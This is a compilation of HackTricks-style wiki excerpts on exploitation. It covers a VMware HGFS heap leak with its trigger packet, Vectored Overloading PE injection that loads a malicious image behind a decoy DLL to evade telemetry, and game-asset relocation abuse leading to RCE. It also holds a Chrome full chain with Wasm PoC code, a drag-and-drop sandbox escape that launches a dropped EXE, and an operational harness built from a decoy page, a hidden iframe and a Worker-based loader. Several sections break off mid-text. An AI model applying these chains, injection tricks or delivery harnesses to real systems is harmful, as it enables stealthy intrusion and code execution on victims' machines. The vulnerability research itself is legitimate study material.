title: HT: VM Escape and Hypervisor Exploitation (vm-escape-and-hypervisor-exploitation)
text: # VM Escape and Hypervisor Exploitation {{#include ../banners/hacktricks-training.md}} Start with the guest-controlled surface, not the hypervisor brand. Virtual networking, emulated display and storage devices, shared-folder protocols, and host services exposed to the guest lead to different host-side parsers and prerequisites. The following chapters keep each exploit chain and its platform-specific limits intact: - **QEMU/KVM, multiple boundaries:** [QEMU/KVM VM Escape Chains](qemu-kvm-vm-escape-chains.md) maps KVM translations, device models, libslirp, and host-loopback services. - **VirtualBox NAT packets:** [VirtualBox Slirp NAT Packet Heap Exploitation](libc-heap/virtualbox-slirp-nat-packet-heap-exploitation.md) follows packet-length confusion through a custom zone allocator to host-process execution. - **VirtualBox display device:** [VirtualBox VMSVGA COTable UAF Escape](virtualbox-vmsvga-cotable-uaf-escape.md) uses stale guest-backed object references and typed device commands. - **VMware shared folders:** [VMware HGFS OOB Read to VMX ASLR Bypass](vmware-hgfs-oob-read-aslr-bypass.md) is a host-pointer disclosure, not a standalone escape. - **VMware paravirtual SCSI:** [VMware Workstation PVSCSI LFH Escape](vmware-workstation-pvscsi-lfh-escape.md) covers the Workstation-on-Windows heap-corruption chain and its ESXi sandbox distinction. For the general corruption primitives used by these cases, see [Use After Free](libc-heap/use-after-free/README.md), [Heap Overflow](libc-heap/heap-overflow.md), and [Arbitrary Write to Code Execution](arbitrary-write-2-exec/README.md). {{#include ../banners/hacktricks-training.md}}

title: HT: VMware HGFS OOB Read to VMX ASLR Bypass (vmware-hgfs-oob-read-aslr-bypass)
text: # VMware HGFS OOB Read to VMX ASLR Bypass {{#include ../banners/hacktricks-training.md}} VMware HGFS exposes host-side parsing inside the per-VM `vmware-vmx.exe`/`vmx` process. CVE-2025-22226 is a useful example of turning a **logically undersized HGFS payload** into an 8-byte host-heap disclosure: a privileged guest reaches `HGFileCopyCreateSessionCB`, the callback trusts fields beyond the operation's declared payload, and the leaked bytes return as an invalid session ID. The demonstrated primitive defeats VMX ASLR but does **not** provide standalone code execution or a complete guest escape.<sup>[[1]](#references)[[4]](#references)</sup>

title: HT: Backdoor, RPCI and TCLO reachability (vmware-hgfs-oob-read-aslr-bypass)
text: ## Backdoor, RPCI and TCLO reachability VMware Tools functionality such as shared folders and drag-and-drop crosses the guest/host boundary through VMware's Backdoor interface. The low-bandwidth interface uses magic `0x564D5868` and I/O port `0x5658`; high-bandwidth transfers use port `0x5659`. VMware intercepts the guest `in`/`out` operation and treats the register state as a Backdoor request.<sup>[[1]](#references)[[2]](#references)</sup> ```c #define BDOOR_MAGIC 0x564D5868 #define BDOOR_PORT 0x5658 #define BDOORHB_PORT 0x5659 ``` A normal RPCI exchange is a seven-stage channel transaction: `OPEN` → `SENDSIZE` → `SENDPAYLOAD` → `RECVSIZE` → `RECVPAYLOAD` → `RECVSTATUS` → `CLOSE`.<sup>[[1]](#references)[[3]](#references)</sup> TCLO must not be treated as another sequential RPC request. It is a host/guest event loop: poll, consume the current host command, return the expected response, and register the required application before sending application traffic. For example, a host `reset` requires the expected `OK ATR ...` response, while DnD/HGFS traffic requires the `toolbox-dnd` channel. Sending registration and the HGFS packet back-to-back produces protocol or channel-conflict errors instead of reaching the parser.<sup>[[1]](#references)</sup> For a custom client, implement empty polls, pings, registration and command-response ordering. An existing VMware Tools instance can already own `toolbox-dnd`, so a lab harness may need to stop/remove it before taking control of TCLO. The [`go-vmw-guestrpc` nanotoolbox](https://github.com/equinix-ms/go-vmw-guestrpc) implementation provides portable Backdoor/RPCI/TCLO building blocks; the researched path reaches the callback after `tools.set.version 1` and the host's `f` command, without requiring a physical drag-and-drop action.<

title: HT: Length-confusion root cause (vmware-hgfs-oob-read-aslr-bypass)
text: ## Length-confusion root cause The HGFS new-header parser first validates the outer envelope and derives the logical payload as follows:<sup>[[1]](#references)</sup> ```c if (input_size < 0x34 || marker != 0xff) return 7; if (packetSize > input_size || headerSize > packetSize) return 7; payload_size = packetSize - headerSize; payload_ptr = payload_size ? &input->version + headerSize : NULL; ``` Those checks prove that `payload_ptr` starts within the packet, but not that the selected operation has enough payload for every later dereference. For operation `0x29` (`HGFS_OP_CREATE_SESSION_V4`), the vulnerable `HGFileCopyCreateSessionCB` path reads a session ID from `*(uint64_t *)payload_ptr` and another 32-bit field from `payload_ptr + 12` even when `payload_size == 1`. The first read therefore extends seven bytes beyond the logical payload and the second starts eleven bytes beyond it.<sup>[[1]](#references)</sup> The trigger keeps the physical input large enough for the outer checks while declaring a one-byte logical payload. The TCLO prefix and important HGFS fields are:<sup>[[1]](#references)</sup> ```text 4f 4b 20 # "OK " 00 00 00 00 ff 00 00 00 # version/reserved + new-header marker a5 c5 00 00 a4 c5 00 00 # packetSize=0xc5a5, headerSize=0xc5a4 00 00 00 80 29 00 00 00 # requestId=0x80000000, operation=0x29 ... 50573 zero bytes ... ``` Because `0xc5a5 - 0xc5a4 == 1`, the callback consumes memory after the declared payload. The copied 8-byte value is stored as the new session ID and becomes observable by the guest when HGFS reports the invalid session.<sup>[[1]](#references)</sup>

title: HT: Heap grooming into a pointer leak (vmware-hgfs-oob-read-aslr-bypass)
text: ## Heap grooming into a pointer leak The raw disclosure is allocation-state dependent. The successful strategy combines Backdoor-channel allocation/free activity with variable-length `SetGuestInfo 7 11111111<padding>` requests to move a useful VMX pointer next to the one-byte payload. Tune both declared sizes together so their difference stays one, and adjust the real filler length by the same delta. One reported Workstation layout changed `packetSize/headerSize` from `0xc5a5/0xc5a4` to `0xc5ae/0xc5ad` and increased the filler by nine bytes.<sup>[[1]](#references)</sup> Treat the returned session field as a little-endian `uint64_t`, reject values that do not match the expected host-pointer pattern, and subtract the pointer's known module-relative offset to recover the VMX image base. The exact grooming length and leaked region are build- and platform-specific: the published tuning yielded a `vmware-vmx` pointer on Windows, while the same client on Linux leaked a pointer from another region.<sup>[[1]](#references)</sup> ```go session := args[36:44] leak := binary.LittleEndian.Uint64(session) vmxBase := leak - knownOffset // only after classifying the pointer ``` This is an **information-disclosure/ASLR-bypass stage**. A separate memory-corruption primitive is still required for control flow; the original research considered chaining it with the VMCI out-of-bounds write in CVE-2025-22224.<sup>[[1]](#references)</sup>

title: HT: Patch-diffing and the correct invariant (vmware-hgfs-oob-read-aslr-bypass)
text: ## Patch-diffing and the correct invariant Diffing Workstation `17.6.2` against `17.6.3`, then breaking on changed functions reached by the guest harness, isolated `HGFileCopyCreateSessionCB`. A second ESXi `8.0 U3c`/`U3d` diff confirmed the same added validation. This illustrates an effective closed-source workflow: diff patched binaries, instrument changed functions at runtime, drive a legitimate protocol transaction, and identify the first new check on attacker-derived length data.<sup>[[1]](#references)</sup> The fix adds an operation-specific minimum-size table check before any callback dereference:<sup>[[1]](#references)</sup> ```c if (payload_size < minimum_payload_size[operation]) return 7; ``` For `HGFS_OP_CREATE_SESSION_V4`, the minimum is `0x24`. The reusable audit lesson is that validating `headerSize <= packetSize <= input_size` is insufficient: the parser must also validate the minimum structure size for the selected opcode at the point where that opcode's fields are consumed.<sup>[[1]](#references)</sup>

title: HT: Vectored Overloading PE Injection (windows-vectored-overloading)
text: # Vectored Overloading PE Injection {{#include ../banners/hacktricks-training.md}} > [!TIP] > Looking for Windows 11 LFH heap shaping and VMware Workstation PVSCSI (vmware-vmx) escape techniques? > > {{#ref}} > vmware-workstation-pvscsi-lfh-escape.md > {{#endref}} For deliberate faults, `INT3` interception, and debugger-dependent single stepping outside this PE injection workflow, see [Windows exception-driven control flow](../reversing/windows-exception-driven-control-flow.md).

title: HT: Technique overview (windows-vectored-overloading)
text: ## Technique overview Vectored Overloading is a **Windows PE injection primitive** that combines classic Module Overloading with **Vectored Exception Handlers (VEHs)** and **hardware breakpoints**. Instead of patching `LoadLibrary` or writing its own loader, the adversary:<sup>[[1]](#references)</sup><sup>[[4]](#references)</sup> 1. Creates a `SEC_IMAGE` section backed by a legitimate DLL (e.g., `wmp.dll`). 2. Overwrites the mapped view with a fully relocated malicious PE but keeps the section object pointing to the benign image on disk. 3. Registers a VEH and programs debug registers so every call to `NtOpenSection`, `NtMapViewOfSection`, and optionally `NtClose` raises a user-mode breakpoint. 4. Calls `LoadLibrary("amsi.dll")` (or any other benign target). When the Windows loader invokes those syscalls, the VEH **skips the kernel transition** and returns the handles and base addresses of the prepared malicious image. Because the loader still believes it mapped the requested DLL, tooling that only looks at section backing files sees `wmp.dll` even though memory now contains the attacker’s payload. Meanwhile, imports/TLS callbacks are still resolved by the genuine loader, significantly reducing the amount of custom PE-parsing logic the adversary must maintain.<sup>[[1]](#references)</sup>

title: HT: Stage 1 – Build the disguised section (windows-vectored-overloading)
text: ## Stage 1 – Build the disguised section 1. **Create and map a section for the decoy DLL** ```c NtCreateSection(&DecoySection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READWRITE, SEC_IMAGE, L"\??\C:\\Windows\\System32\\wmp.dll"); NtMapViewOfSection(DecoySection, GetCurrentProcess(), &DecoyView, 0, 0, NULL, &DecoySize, ViewShare, 0, PAGE_READWRITE); ``` 2. **Copy the malicious PE into that view** section by section, honouring `SizeOfRawData`/`VirtualSize` and updating protections afterwards (`PAGE_EXECUTE_READ`, `PAGE_READWRITE`, etc.). 3. **Apply relocations and resolve imports** exactly as a reflective loader would. Because the view is already mapped as `SEC_IMAGE`, section alignments and guard pages match what the Windows loader expects later. 4. **Normalize the PE header**: - If the payload is an EXE, set `IMAGE_FILE_HEADER.Characteristics |= IMAGE_FILE_DLL` and zero the entry point to keep `LdrpCallTlsInitializers` from jumping into EXE-specific stubs. - DLL payloads can keep their headers unchanged. At this point the process owns a RWX-capable view whose backing object is still `wmp.dll`, yet the bytes in memory are attacker-controlled.<sup>[[1]](#references)</sup>

title: HT: Stage 2 – Hijack the loader with VEHs (windows-vectored-overloading)
text: ## Stage 2 – Hijack the loader with VEHs 1. **Register a VEH and arm hardware breakpoints**: program `Dr0` (or another debug register) with the address of `ntdll!NtOpenSection` and set `DR7` so every execution raises `STATUS_SINGLE_STEP`. Repeat later for `NtMapViewOfSection` and optionally `NtClose`. 2. **Trigger DLL loading** with `LoadLibrary("amsi.dll")`. `LdrLoadDll` will eventually call `NtOpenSection` to obtain the real section handle. 3. **VEH hook for `NtOpenSection`**: - Locate the stack slot for the `[out] PHANDLE SectionHandle` argument. - Write the previously created `DecoySection` handle into that slot. - Advance `RIP`/`EIP` to the `ret` instruction so the kernel is never called. - Re-arm the hardware breakpoint to watch `NtMapViewOfSection` next. 4. **VEH hook for `NtMapViewOfSection`**: - Overwrite the `[out] PVOID *BaseAddress` (and size/protection outputs) with the address of the already mapped malicious view. - Skip the syscall body just like before. 5. **(Optional) VEH hook for `NtClose`** verifies that the fake section handle is cleaned up, preventing resource leaks and providing a final sanity check. Because the syscalls are never executed, kernel callbacks (ETWti, minifilter, etc.) do not observe the suspicious `NtOpenSection`/`NtMapViewOfSection` events, drastically lowering telemetry. From the loader’s point of view everything succeeded and `amsi.dll` is in memory, so it proceeds with import/TLS resolution against the attacker’s bytes.<sup>[[1]](#references)</sup> ### PoC implementation notes (2025) The public PoC shows a few practical details that are easy to miss when re-implementing the technique:<sup>[[2]](#references)</sup> - **HWBPs are per-thread**. The PoC sets `CONTEXT_DEBUG_REGISTERS` on the **current thread** before calling `LoadLibra

title: HT: Stage 3 – Execute the payload (windows-vectored-overloading)
text: ## Stage 3 – Execute the payload - **EXE payload**: The injector simply jumps to the original entry point once relocations are done. When the loader thinks it would call `DllMain`, the custom code instead executes the EXE-style entry. - **DLL payload / Node.js addon**: Resolve and call the intended export (Kidkadi exposes a named function to JavaScript). Because the module is already registered with `LdrpModuleBaseAddressIndex`, subsequent lookups see it as the benign DLL. When combined with a Node.js native addon (`.node` file), all of the Windows-internals heavy lifting stays outside the JavaScript layer, helping the threat actor ship the same loader with many different obfuscated Node wrappers.<sup>[[1]](#references)</sup>

title: HT: Unsafe Relocation Fixups in Asset Loaders (common-exploiting-problems-unsafe-relocation-fixups)
text: # Unsafe Relocation Fixups in Asset Loaders {{#include ../banners/hacktricks-training.md}}

title: HT: Why asset relocations matter (common-exploiting-problems-unsafe-relocation-fixups)
text: ## Why asset relocations matter Many legacy game engines (Granny 3D, Gamebryo, etc.) load complex assets by: 1. Parsing a header and section table. 2. Allocating one heap buffer per section. 3. Building a `SectionArray` that stores the base pointer of every section. 4. Applying relocation tables so that pointers embedded inside the section data get patched to the right target section + offset. When the relocation handler blindly trusts attacker-controlled metadata, every relocation becomes a potential arbitrary read/write primitive. In *Anno 1404: Venice*, `granny2.dll` ships the following helper:<sup>[[1]](#references)</sup> <details> <summary>`GrannyGRNFixUp_0` (trimmed)</summary> ```c int *__cdecl GrannyGRNFixUp_0(DWORD RelocationCount, Relocation *PointerFixupArray, int *SectionArray, char *destination) { while (RelocationCount--) { int target_base = SectionArray[PointerFixupArray->SectionNumber]; // unchecked index int *patch_site = (int *)(destination + PointerFixupArray->SectionOffset); // unchecked offset *patch_site = target_base ; if (target_base) *patch_site = target_base + PointerFixupArray->Offset; ++PointerFixupArray; } return SectionArray; } ``` </details> `SectionNumber` is never range-checked and `SectionOffset` is never validated against the current section size. Crafting relocation entries with negative offsets or oversized indices lets you walk outside the section you control and stomp allocator metadata such as the section pointer array itself.<sup>[[1]](#references)</sup>

title: HT: Stage 1 – Writing backwards into loader metadata (common-exploiting-problems-unsafe-relocation-fixups)
text: ## Stage 1 – Writing backwards into loader metadata The goal is to make the relocation table of **section 0** overwrite entries of `SectionContentArray` (which mirrors `SectionArray` and is stored right before the first section buffer). Because Granny’s custom allocator prepends **0x1F** bytes and the NT heap adds its own **0x10**-byte header plus alignment, an attacker can precalculate the distance between the start of the first section (`destination`) and the section-pointer array. In the tested build, forcing the loader to allocate a `GrannyFile` structure that is exactly **0x4000 bytes** makes the section-pointer arrays land right before the first section buffer.<sup>[[1]](#references)</sup> Solving ``` 0x20 (header) + 0x20 (section descriptors) + n * 1 (section types) + n * 1 (flags) + n * 4 (pointer table) = 0x4000 ``` gives **n = 2720** sections. A relocation entry with `SectionOffset = -0x3FF0` ( `0x4000 - 0x20 - 0x20 + 0x30` ) now resolves to `SectionContentArray[1]` even though the destination section thinks it is patching internal pointers.<sup>[[1]](#references)</sup>

title: HT: Stage 2 – Deterministic heap layout on Windows 10 (common-exploiting-problems-unsafe-relocation-fixups)
text: ## Stage 2 – Deterministic heap layout on Windows 10 Windows 10 NT Heap routes allocations **≤ RtlpLargestLfhBlock (0x4000)** to the randomized LFH and larger ones to the deterministic backend allocator.<sup>[[2]](#references)</sup> By keeping the `GrannyFile` metadata slightly above that threshold (using the 2720 sections trick) and preloading several malicious `.gr2` assets, you can make:<sup>[[1]](#references)</sup> - Allocation #1 (metadata + section pointer arrays) land in a >0x4000 backend chunk. - Allocation #2 (section 0 contents) land immediately after allocation #1. - Allocation #3 (section 1 contents) land right after allocation #2, giving you a predictable target for subsequent relocations. Process Monitor confirmed that assets are streamed on demand, so repeatedly requesting crafted units/buildings is enough to “prime” the heap layout without touching the executable image.<sup>[[1]](#references)</sup>

title: HT: Stage 3 – Converting the primitive into RCE (common-exploiting-problems-unsafe-relocation-fixups)
text: ## Stage 3 – Converting the primitive into RCE 1. **Corrupt `SectionContentArray[1]`.** Section 0’s relocation table overwrites it by using the `-0x3FF0` offset. Point it at any writable region you control (e.g., later section data). 2. **Recycle the corrupted pointer.** Section 1’s relocation table now treats `SectionNumber = 1` as whatever pointer you injected. The handler writes `SectionArray[1] + Offset` to `destination + SectionOffset`, giving you an arbitrary 4-byte write for every relocation entry. 3. **Hit reliable dispatchers.** In Anno 1404 the target of choice was the `granny2.dll` allocator callbacks (no ASLR, DEP disabled). Overwriting the function pointer that `granny2.dll` uses for the next `Malloc`/`Free` call immediately diverts execution to attacker-controlled code loaded from the trojanized asset. Because both `granny2.dll` and the injected `.gr2` buffers reside at stable addresses when ASLR/DEP are disabled, the attack reduces to building a small ROP chain or raw shellcode and pointing the callback at it.<sup>[[1]](#references)</sup>

title: HT: Practical checklist (common-exploiting-problems-unsafe-relocation-fixups)
text: ## Practical checklist - Look for asset loaders that maintain `SectionArray` / relocation tables. - Diff relocation handlers for missing bounds on indices/offsets. - Measure the allocator headers added by both the game’s allocator wrapper and the underlying OS heap to compute backwards offsets precisely. - Force deterministic placement by: - inflating metadata (many empty sections) until allocation size > `RtlpLargestLfhBlock`; - repeatedly loading the malicious asset to fill backend holes. - Use a two-stage relocation table (first to retarget `SectionArray`, second to spray writes) and overwrite function pointers that will fire during normal rendering (allocator callbacks, virtual tables, animation dispatchers, etc.). Once you gain an arbitrary file write (e.g., via the path traversal in the multiplayer save transfer), repackaging RDA archives with the crafted `.gr2` gives you a clean delivery vector that is automatically decompressed by remote clients.<sup>[[1]](#references)</sup>

title: HT: Chrome Exploiting (chrome-exploiting)
text: # Chrome Exploiting {{#include ../banners/hacktricks-training.md}} > This page provides a high-level yet **practical** overview of a modern "full-chain" exploitation workflow against Google Chrome 130 based on the research series **“101 Chrome Exploitation”** (Part-0 — Preface).<sup>[[1]](#references)</sup> > The goal is to give pentesters and exploit-developers the minimum background necessary to reproduce or adapt the techniques for their own research.

title: HT: 1. Chrome Architecture Recap   (chrome-exploiting)
text: ## 1. Chrome Architecture Recap Understanding the attack surface requires knowing where code is executed and which sandboxes apply.<sup>[[2]](#references)</sup> <details> <summary>Chrome process & sandbox layout</summary> ```text +-------------------------------------------------------------------------+ | Chrome Browser | | | | +----------------------------+ +-----------------------------+ | | | Renderer Process | | Browser/main Process | | | | [No direct OS access] | | [OS access] | | | | +----------------------+ | | | | | | | V8 Sandbox | | | | | | | | [JavaScript / Wasm] | | | | | | | +----------------------+ | | | | | +----------------------------+ +-----------------------------+ | | | IPC/Mojo | | | V | | | +----------------------------+ | | | | GPU Process | | | | | [Restricted OS access] | | | | +----------------------------+ | | +-------------------------------------------------------------------------+ ``` </details> Layered defence-in-depth:<sup>[[2]](#references)</sup> * **V8 sandbox** (Isolate): memory permissions are restricted to prevent arbitrary read/write from JITed JS / Wasm. * **Renderer ↔ Browser split** ensured via **Mojo/IPC** message passing; the renderer has *no* native FS/network access. * **OS sandboxes** further contain each process (Windows Integrity Levels / `seccomp-bpf` / macOS sandbox profiles). A *remote* attacker therefore needs **three** successive primitives:<sup>[[1]](#references)</sup> 1. Memory corruption inside V8 to get **arbitrary RW inside the V8 heap**. 2. A second bug allowing the attacker to **escape the V8 sandbox to full renderer memory**. 3. A final sandbox-escape (often logic rather than memory corruption) to execute code **outside of the Chrome OS sandbox**. ---

title: HT: 2. Stage 1 – WebAssembly Type-Confusion (CVE-2025-0291) (chrome-exploiting)
text: ## 2. Stage 1 – WebAssembly Type-Confusion (CVE-2025-0291) A flaw in TurboFan’s **Turboshaft** optimisation mis-classifies **WasmGC reference types** when the value is produced and consumed inside a *single basic block loop*.[[1]](#references) Effect: * The compiler **skips the type-check**, treating a *reference* (`externref/anyref`) as an *int64*. * Crafted Wasm allows overlapping a JS object header with attacker-controlled data → addrOf() & fakeObj() **AAW / AAR primitives**. Minimal PoC (excerpt): ```WebAssembly (module (type $t0 (func (param externref) (result externref))) (func $f (param $p externref) (result externref) (local $l externref) block $exit loop $loop local.get $p ;; value with real ref-type ;; compiler incorrectly re-uses it as int64 in the same block br_if $exit ;; exit condition keeps us single-block br $loop end end) (export "f" (func $f))) ``` Trigger optimisation & spray objects from JS: ```js const wasmMod = new WebAssembly.Module(bytes); const wasmInst = new WebAssembly.Instance(wasmMod); const f = wasmInst.exports.f; for (let i = 0; i < 1e5; ++i) f({}); // warm-up for JIT // primitives let victim = {m: 13.37}; let fake = arbitrary_data_backed_typedarray; let addrVict = addrOf(victim); ``` Outcome: **arbitrary read/write within V8**. ---

title: HT: 3. Stage 2 – Escaping the V8 Sandbox (issue 379140430) (chrome-exploiting)
text: ## 3. Stage 2 – Escaping the V8 Sandbox (issue 379140430) When a Wasm function is tier-up-compiled, a **JS ↔ Wasm wrapper** is generated. A signature-mismatch bug causes the wrapper to write past the end of a trusted **`Tuple2`** object when the Wasm function is re-optimised *while still on the stack*.<sup>[[1]](#references)</sup> Overwriting the 2 × 64-bit fields of the `Tuple2` object yields **read/write on any address inside the Renderer process**, effectively bypassing the V8 sandbox.<sup>[[1]](#references)</sup> Key steps in exploit: 1. Get function into **Tier-Up** state by alternating turbofan/baseline code. 2. Trigger tier-up while keeping a reference on the stack (`Function.prototype.apply`). 3. Use Stage-1 AAR/AAW to find & corrupt the adjacent `Tuple2`. Wrapper identification: ```js function wrapperGen(arg) { return f(arg); } %WasmTierUpFunction(f); // force tier-up (internals-only flag) wrapperGen(0x1337n); ``` After corruption we possess a fully-featured **renderer R/W primitive**. ---

title: HT: 3.1 Pointer-Compressed V8 Escape Chain: Caged R/W → Native Leak → Stack Pivot (chrome-exploiting)
text: ## 3.1 Pointer-Compressed V8 Escape Chain: Caged R/W → Native Leak → Stack Pivot An alternative V8-sandbox escape does **not** require unrestricted renderer read/write. A historical Chrome 150 chain combined a compiler-assisted address disclosure, a missing generational-GC barrier, an `ExternalString` bounds abuse, and a JSPI/JS Dispatch Table (JDT) metadata mismatch. The useful lesson is the separation of capabilities: one primitive can disclose a native module address while a different bug supplies native control flow.<sup>[[10]](#references)[[11]](#references)</sup> ### Cage and tagged-value model On 64-bit pointer-compressed V8 builds, many tagged heap references are stored as 32-bit offsets from a cage base. The low bit distinguishes a Smi (`0`) from a heap-object reference (`1`), and the 32-bit offset limits ordinary forged heap references to a 4 GB address range.<sup>[[3]](#references)</sup> ```text compressed heap reference: [ 31-bit cage offset | 1 ] compressed Smi: [ signed integer | 0 ] ``` The V8 sandbox assumes that an attacker may already corrupt the entire in-sandbox address space. Native resources and trusted call targets are therefore represented through indirection such as external, trusted, code, and dispatch tables rather than writable raw pointers in ordinary heap objects. Consequently, `addrof` and arbitrary cage read/write are intermediate primitives, not a sandbox escape by themselves.<sup>[[4]](#references)</sup> ### Web-compatible tiering and compressed `addrof` Shell-only helpers such as `%OptimizeFunctionOnNextCall` are unavailable to a malicious webpage. A browser exploit can instead collect feedback and request optimized compilation by repeatedly calling the vulnerable function through synchronous native events; pauses give concurrent compi

title: HT: 3.2 Recursive parser state → trusted Wasm stream corruption (chrome-exploiting)
text: ## 3.2 Recursive parser state → trusted Wasm stream corruption An important parser-audit pattern is a recursive routine that records an output-buffer position in a field shared by every recursion level. In V8's historical AsmJS path, `ValidateHeapAccess()` expected the state returned by `ShiftExpression()` to describe the top-level `index >> log2(element_size)` operation. It later passed that position to `WasmFunctionBuilder::DeleteCodeAfter()` so the shift could be replaced with an alignment mask. A nested shift could overwrite the same parser fields even when the top-level operation was a left shift. The later truncation then discarded code from the inner checkpoint.<sup>[[12]](#references)</sup> ```text ValidateHeapAccess -> ShiftExpression (outer `<<`, clears shared checkpoint) -> AdditiveExpression -> ShiftExpression (inner `>> 2`, saves its checkpoint) -> DeleteCodeAfter(inner_checkpoint) # stale for the outer expression -> emit i32.const ~(size - 1); i32.and ``` This is more than malformed syntax. Truncation can stop inside an encoded immediate, after which the remaining immediate bytes become instruction bytes. Expressions emitted after the heap access therefore act as an **opcode-byte steering surface**. The following crash-oriented trigger makes the decoder eventually interpret a byte from the IEEE-754 representation of `1.1` as an invalid opcode; it demonstrates stream desynchronization but is not a complete escape exploit.<sup>[[12]](#references)</sup> ```javascript function AsmModule(stdlib, foreign, heap) { "use asm"; var HEAP32 = new stdlib.Int32Array(heap); function g() { return 1.25; } function f(a, b, c) { a=a|0; b=b|0; c=c|0; HEAP32[1 << (b >> 2) + ~~+g()] = c; 1.1; return c|0; } return {f:f}; } ``` ### Turning decoder corruption into an Ubercage esca

title: HT: 3.3 Maglev iterator type confusion and Wasm pointer-table pivot (chrome-exploiting)
text: ## 3.3 Maglev iterator type confusion and Wasm pointer-table pivot A Chrome 149 / V8 14.9.207.35 macOS arm64 chain combines separate in-process V8-sandbox bugs; it does **not** escape Chrome's OS process sandbox. Its object layouts, allocation sizes and native offsets are build-specific. A sandbox-enabled `d8` can exercise V8-only stages, but the Blink-backed string and WebRTC allocations require Chrome.<sup>[[23]](#references)[[24]](#references)</sup> ### From an unchecked array Map to full V8-sandbox access Maglev inlined `ArrayIterator.prototype.next()` without rechecking the iterated array's Map before the element load. Sloppy-mode `Function.arguments` mutation changed the array between double and tagged elements after Maglev selected a load representation. Interpreting an object as double data yielded `addrof`; interpreting crafted double bits as a tagged value yielded `fakeobj`.<sup>[[19]](#references)[[23]](#references)[[24]](#references)</sup> V8 fixed the missing Map check with `BuildCheckMaps()`.<sup>[[19]](#references)</sup> As in the [fake-array technique above](#missing-old-to-young-barrier--fake-array), a forged `JSArray` header and retargeted `elements` pointer turn those primitives into read/write within the 4-GB pointer-compression cage. This chain widened access by corrupting metadata on two preallocated `DataView`/resizable-`ArrayBuffer` pairs: one view remained a control window over cage metadata, while its changes to the other view's length and sandboxed backing-store pointer retargeted a data window across the 1-TB V8 sandbox. That is still **in-sandbox** access, not native process-memory read/write.<sup>[[23]](#references)[[24]](#references)</sup> ### Native disclosure through signed string-slice offsets With sandbox read/write, the chain changed

title: HT: 4. Stage 3 – Renderer → OS Sandbox Escape (CVE-2024-11114) (chrome-exploiting)
text: ## 4. Stage 3 – Renderer → OS Sandbox Escape (CVE-2024-11114) The **Mojo** IPC interface `blink.mojom.DragService.startDragging()` can be called from the Renderer with *partially trusted* parameters. By crafting a `DragData` structure pointing to an **arbitrary file path** the renderer convinces the browser to perform a *native* drag-and-drop **outside the renderer sandbox**.<sup>[[1]](#references)</sup> Abusing this we can programmatically “drag” a malicious EXE (previously dropped in a world-writable location) onto the Desktop, where Windows automatically executes certain file-types once dropped. Example (simplified): ```js const payloadPath = "C:\\Users\\Public\\explorer.exe"; chrome.webview.postMessage({ type: "DragStart", data: { title: "MyFile", file_path: payloadPath, mime_type: "application/x-msdownload" } }); ``` No additional memory corruption is necessary – the **logic flaw** gives us arbitrary file execution with the user’s privileges. ---

title: HT: 5. Full Chain Flow (chrome-exploiting)
text: ## 5. Full Chain Flow 1. **User visits** malicious webpage. 2. **Stage 1**: Wasm module abuses CVE-2025-0291 → V8 heap AAR/AAW. 3. **Stage 2**: Wrapper mismatch corrupts `Tuple2` → escape V8 sandbox. 4. **Stage 3**: `startDragging()` IPC → escape OS sandbox & execute payload. Result: **Remote Code Execution (RCE)** on the host (Chrome 130, Windows/Linux/macOS). ---

title: HT: Privileged browser navigation: validate the initiator and bind the target tab (chrome-exploiting)
text: ## Privileged browser navigation: validate the initiator and bind the target tab Edge's CA Guidance flow shows three navigation-validation mistakes. Its entry check compared the host but not the scheme, so an HTTPS URL could reach logic intended for an `edge://` page. The navigation throttle then checked the tab's `GetVisibleURL` for a Microsoft sign-in page instead of the request's `GetInitiatorOrigin`. An untrusted initiator could therefore pass the check when the tab displayed a trusted page. Finally, `switch_profile` was used as a navigation target without a scheme allowlist, admitting `javascript:`. When reviewing privileged browser navigation, distinguish the displayed URL from the initiator and validate the complete entry and destination schemes; this is a browser-process gate, not a [DOM open-redirect sink](../pentesting-web/xss-cross-site-scripting/dom-xss.md#open-redirect).<sup>[[15]](#references)[[18]](#references)</sup> The same flow also had an **asynchronous target-tab mismatch**. When `email` matched the current profile, `HandleCAErrorPageGuidance` posted navigation to `switch_profile` but captured a `WeakPtr<Browser>` rather than the checked tab's `WebContents`. With `CURRENT_TAB`, `Navigate` resolved `GetActiveWebContents` only when the callback ran. If a different tab became active first, the `javascript:` navigation could run in that tab, including a privileged page, yielding UXSS and access to its browser APIs. The fix captured `WeakPtr<WebContents>` for the intended tab. For similar deferred browser actions, verify that the object authorized at check time remains the object used at execution time; a live browser-window pointer alone does not preserve tab identity.<sup>[[16]](#references)[[18]](#references)</sup> The route did not need V8 memory corr

title: HT: Operational browser-exploit harness (chrome-exploiting)
text: ## Operational browser-exploit harness ### Exploiting the upstream-to-release patch gap An upstream Chromium fix can be public before it reaches a stable Chrome release. During this window, the bug is an N-day in the source tree but an effective zero-day against released browsers. Diffing the fix can reveal the broken invariant, while runtime leaks and build fingerprinting can replace brittle constants and make the chain survive nearby point releases.<sup>[[14]](#references)</sup> ### Decoy page, hidden frame, and Worker execution A small loader can filter by browser and OS, keep a benign decoy visible, and append a hidden iframe whose URL carries the exploit configuration. The exploit page can store its source in `<script type="text/plain">` elements so it remains inert, concatenate the text at runtime, and start it from a Blob-backed dedicated Worker. This keeps control logic away from the UI thread and makes recoverable failures less visible. A Worker is not a security boundary, so do not rely on it to contain a native renderer-process crash.<sup>[[14]](#references)</sup> ```javascript const q = new URLSearchParams(location.search); if (q.get("mode") !== "payload") throw new Error("disarmed"); const source = [...document.querySelectorAll('script[type="text/plain"]')] .map(node => node.textContent).join("\n"); const workerGlue = document.querySelector("#worker-glue").textContent; const blob = new Blob([source, workerGlue], {type: "text/javascript"}); const worker = new Worker(URL.createObjectURL(blob)); ``` Treat URL parameters as a control plane instead of hard-coding campaign behavior. Useful parameter classes observed in a mature harness were:<sup>[[14]](#references)</sup> | Class | Example controls | Purpose | | --- | --- | --- | | Arming | `mode`, `dry`, `runpayl

title: HT: VM Escape Chains (common-exploiting-problems)
text: ## VM Escape Chains If the target is a guest-to-host boundary rather than a generic exploit-development obstacle, use [VM Escape and Hypervisor Exploitation](vm-escape-and-hypervisor-exploitation.md) to choose the QEMU/KVM, VirtualBox, or VMware case by guest-controlled surface.

title: HT: FDs in Remote Exploitation (common-exploiting-problems)
